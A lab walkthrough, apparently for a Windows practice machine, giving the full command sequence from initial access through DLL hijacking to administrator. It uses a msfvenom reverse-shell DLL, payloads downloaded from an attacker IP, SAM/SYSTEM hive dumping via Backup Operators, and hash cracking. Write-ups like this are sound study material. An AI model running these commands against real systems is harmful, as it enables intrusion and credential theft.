# walkthlough
1. dianaに初期侵入
2. 初期パスワードメモを発見
3. C直下のサービス発見
4. alexに横展開
5. EnterpriseServiceサービスのログから不足しているdll名を発見
6. EnterpriseServiceOptional.dllを作成しC:\Services\に配置サービス再起動
7. enterpriseuserがBackup Operatorsに所属していることを確認

Klai
```bash
nc 192.168.146.222 4444
```

Victim(diana)
```powershell
powershell
whoami
# diana
net user
# alex
cd C:\Users\diana\Documents
dir
# note1.txt
---
# note22.txt

type note2.txt
Default password for new resets will be WelcomeToWinter0121

iwr -uri http://192.168.45.176/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
# nterprise Service Checks(Enterprise Service Checks)["C:\Services\EnterpriseService.exe"] - Autoload
# Possible DLL Hijacking in binary folder: C:\Services (Authenticated Users [Allow: WriteData/CreateFiles])
```

Kali
```bash
# Create Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll

# RDP
xfreerdp3 /u:"alex" /p:'WelcomeToWinter0121' /v:192.168.146.222 /dynamic-resolution

# nc Listener
rlwrap nc -nlvp 4444
```

Victim(alex)
```powershell
# DL dll
iwr -uri http://192.168.45.176/EnterpriseServiceOptional.dll -OutFile "C:\Services\EnterpriseServiceOptional.dll"

# Service Restart
Stop-Service EnterpriseService
Start-Service EnterpriseService
```

Victim(enterpriseuser)
```shell
net localgroup
# Backup Operators
reg save HKLM\sam sam
reg save HKLM\SYSTEM SYSTEM
copy .\sam c:\users\public\
copy .\SYSTEM c:\users\public\
```

Kali
```bash
impacket-secretsdump -sam sam -system SYSTEM LOCAL

hashcat -m 1000 enterpriseadmin.hash /usr/share/wordlists/rockyou.txt --force
# d94267c350fc02154f2aff04d384b354:S3cureStore

xfreerdp3 /u:"enterpriseadmin" /p:'S3cureStore' /v:192.168.146.222 /dynamic-resolution
```